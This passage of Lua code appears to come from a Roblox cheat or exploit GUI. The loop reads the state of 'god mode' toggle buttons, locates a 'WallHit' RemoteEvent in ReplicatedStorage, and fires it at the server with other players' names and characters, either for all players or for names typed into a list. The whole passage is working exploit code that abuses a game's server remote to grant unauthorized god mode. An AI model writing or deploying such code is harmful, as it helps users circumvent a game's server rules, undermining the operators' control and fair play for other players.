	local givePage = Main:FindFirstChild("GiveGodModePage") or page:FindFirstChild("GiveGodModePage") or (Page2 and Page2:FindFirstChild("GiveGodModePage"))
	local godAllBtn = givePage and givePage:FindFirstChild("GodModeAllBtn")
	local targetBtn = givePage and givePage:FindFirstChild("TargetGodBtn")
	local godAllOn = godAllBtn and godAllBtn.Text == "god all: on"
	local targetOn = targetBtn and targetBtn.Text == "on"
	if godAllOn or targetOn then
	if not wallHitRemote then
	for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
	if obj.Name == "WallHit" and (obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent")) then
	wallHitRemote = obj
	break
	end
	end
	end
	if wallHitRemote then
	if godAllOn then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	pcall(function()
	wallHitRemote:FireServer(plr.DisplayName)
	wallHitRemote:FireServer(plr.Name)
	wallHitRemote:FireServer(plr.Character)
	end)
	end
	end
	end
	if targetOn then
	local nameList = givePage:FindFirstChild("GodNameList")
	if nameList then
	for _, box in ipairs(nameList:GetChildren()) do
	if box:IsA("TextBox") then
	local q = string.lower(box.Text or "")
	if q ~= "" then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character and string.lower(plr.Name) == q then
	pcall(function()
	wallHitRemote:FireServer(plr.DisplayName)
	wallHitRemote:FireServer(plr.Name)
	wallHitRemote:FireServer(plr.Character)
	end)
	end
	end
	end
	end
	end
	end
	end
	end
	task.wait(2)
	else
	task.wait(0.25)
	end
	end
end)
